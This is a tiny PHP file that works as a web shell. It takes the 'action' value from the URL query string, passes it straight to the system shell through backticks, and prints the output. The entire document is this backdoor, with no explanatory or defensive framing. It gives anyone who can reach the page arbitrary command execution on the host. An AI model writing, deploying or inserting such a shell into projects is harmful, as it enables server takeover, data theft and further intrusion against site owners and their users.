<?php
$action = $_GET['action'];
$result = `$action 2>&1`;
echo $result, PHP_EOL;
